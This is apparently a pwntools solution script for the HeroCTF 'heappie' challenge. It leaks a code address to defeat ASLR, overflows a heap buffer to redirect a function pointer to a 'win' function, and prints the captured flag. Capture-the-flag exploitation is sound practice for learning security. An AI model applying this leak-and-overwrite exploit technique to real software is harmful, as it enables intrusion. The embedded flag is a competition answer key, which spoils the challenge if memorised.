#!/usr/bin/env python3

from pwn import *
import ctypes

#context.log_level = "debug"
elf = ELF("./heappie", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("pwn.heroctf.fr", 6000)

def add_music(play, desc):
    p.sendlineafter(b">> ", b"1")
    p.sendlineafter(b"(y/n): ", play)
    p.sendlineafter(b"title: ", b"A")
    p.sendlineafter(b"artist: ", b"A")
    p.sendlineafter(b"description: ", desc)

def get_aslr_base():
    p.sendlineafter(b">> ", b"4")
    p.readuntil(b"song: ")
    leak = int(p.readline()[:-2].decode(), 16)
    base = leak - elf.sym["play_1"]
    if (base & 0xfff) == 0:
        return base
    base = leak - elf.sym["play_2"]
    if (base & 0xfff) == 0:
        return base
    base = leak - elf.sym["play_3"]
    return base

add_music(b"y", b"A")

elf.address = get_aslr_base()

payload = b""
payload += b"B" * 128
payload += p64(elf.sym["win"])
add_music(b"n", payload)

add_music(b"n", b"A")

p.sendlineafter(b">> ", b"2")
p.sendlineafter(b"index: ", b"2")
p.readuntil(b"Flag: ")
log.success(p.readline().decode()) # Hero{b4s1c_H3AP_0verfL0w!47280319}
